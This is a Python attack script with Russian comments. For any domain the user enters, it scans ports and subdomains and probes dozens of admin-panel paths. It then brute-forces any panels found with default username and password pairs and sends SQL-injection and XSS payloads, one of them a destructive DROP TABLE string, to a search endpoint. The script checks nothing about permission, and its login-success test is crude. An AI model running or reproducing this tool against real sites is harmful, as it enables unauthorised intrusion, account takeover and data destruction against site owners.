import requests
import socket
import datetime
import os
import html

# =============================
# Конфигурация
# =============================

SUBDOMAINS = [
    "admin", "mail", "ftp", "cpanel", "webmail", "test", "dev", "beta", "vpn", "gateway",
    "server", "intranet", "portal", "secure", "ns1", "ns2", "smtp", "pop", "imap", "api"
]

PORTS = [
    21, 22, 23, 25, 53, 80, 81, 110, 135, 139, 143, 443, 445, 465, 993, 995,
    1433, 1521, 1723, 3306, 3389, 5432, 5900, 8080, 8443, 8888, 10000, 12345,
    137, 138, 161, 389, 512, 513, 514, 873, 1080, 2082, 2083, 2222, 3128, 5000,
    5800, 7000, 8000, 8880, 9000, 9090
]

ADMIN_PATHS = [
    "admin", "admin/login", "admin1", "admin2", "admin_area", "adminLogin",
    "administrator", "cpanel", "dashboard", "user", "users", "login", "log-in",
    "panel", "admin.php", "login.php", "wp-login.php", "admin.asp", "admin.aspx",
    "admin.html", "admin.htm", "admin/cp", "adminControl", "adm", "admin_console",
    "admin_login", "auth", "backend", "controlpanel", "cms", "members", "member",
    "moderator", "secure", "siteadmin", "sysadmin", "system", "login/admin",
    "adminarea", "wp-admin", "admin_site", "loginpanel", "manage", "management",
    "portal", "root", "superadmin", "useradmin", "users/login", "signin",
    "admin/index", "account", "accounts", "config", "control", "core", "webadmin",
    "private", "staff", "secureadmin", "access", "admin/home", "admin/main",
    "login/adminLogin", "admincontrol", "admindashboard", "directadmin", "adminlogin",
    "adminpanel", "adminsite", "member/login", "webmaster", "site/login", "adminarea/login"
]

CREDENTIALS = [
    ("admin", "admin"), ("admin", "1234"), ("admin", "password"), ("admin", "123456"),
    ("root", "root"), ("root", "toor"), ("user", "user"), ("test", "test"),
    ("administrator", "admin"), ("admin", "admin123"), ("admin", "qwerty"),
    ("admin", "1"), ("admin", "1111"), ("admin", "pass"), ("admin", "123"),
    ("admin", "admin1"), ("admin", "letmein")
]

INJECTION_PAYLOADS = [
    "' OR '1'='1", "\" OR \"1\"=\"1", "<script>alert(1)</script>", "'; DROP TABLE users;--"
]

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "warning: mysql", "sqlstate",
    "syntax error", "unclosed quotation", "quoted string not properly terminated",
    "fatal error", "odbc microsoft access driver"
]

# =============================
# Инициализация
# =============================

domain = input("Введите домен (например, example.com): ").strip()
now = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
log_file = os.path.join(LOG_DIR, f"{domain}_{now}.txt")

def log(msg):
    print(msg)
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(msg + "\n")

log(f"\n[+] Сканирование: {domain}")
try:
    ip = socket.gethostbyname(domain)
    log(f"[+] IP адрес: {ip}")
except:
    log("[!] Не удалось получить IP")
    exit()

# =============================
# Скан портов
# =============================
log("\n[+] Скан портов:")
for port in PORTS:
    try:
        s = socket.socket()
        s.settimeout(0.5)
        s.connect((ip, port))
        log(f" [+] Порт открыт: {port}")
        s.close()
    except:
        pass

# =============================
# Поиск поддоменов
# =============================
log("\n[+] Поиск поддоменов:")
for sub in SUBDOMAINS:
    try:
        subdomain = f"{sub}.{domain}"
        socket.gethostbyname(subdomain)
        log(f" [+] Найден поддомен: {subdomain}")
    except:
        pass

# =============================
# Поиск admin-панелей
# =============================
log("\n[+] Поиск admin-панелей:")
found_panels = []
for path in ADMIN_PATHS:
    for scheme in ["http://", "https://"]:
        url = f"{scheme}{domain}/{path}"
        try:
            r = requests.get(url, timeout=5, allow_redirects=True)
            if r.status_code in [200, 301, 302, 403]:
                log(f" [+] Панель найдена: {url} [{r.status_code}]")
                found_panels.append(url)
        except:
            pass

# =============================
# Брутфорс логинов
# =============================
log("\n[+] Попытка входа:")
for panel_url in found_panels:
    for username, password in CREDENTIALS:
        try:
            r = requests.post(panel_url, data={"username": username, "password": password}, timeout=5)
            if "logout" in r.text.lower() or r.status_code in [200, 302]:
                log(f" [✔] Успешный вход: {username}:{password} --> {panel_url}")
                break
        except:
            continue

# =============================
# SQL-инъекция
# =============================
log("\n[+] Проверка SQL-инъекций:")
for payload in INJECTION_PAYLOADS:
    try:
        test_url = f"http://{domain}/search?q={payload}"
        r = requests.get(test_url, timeout=5)
        for error in SQL_ERROR_SIGNATURES:
            if error in r.text.lower():
                log(f" [!] Возможная SQL-инъекция: {test_url}")
                break
    except:
        pass

# =============================
# XSS-инъекция
# =============================
log("\n[+] Проверка XSS-инъекций:")
xss_payload = "<script>alert('XSS')</script>"
xss_url = f"http://{domain}/search?q={xss_payload}"
try:
    r = requests.get(xss_url, timeout=5)
    if xss_payload in r.text or html.escape(xss_payload) in r.text:
        if "<script" in r.text and "alert(" in r.text:
            log(f" [!] Обнаружена XSS: {xss_url}")
except:
    pass

log("\n[✔] Сканирование завершено.")
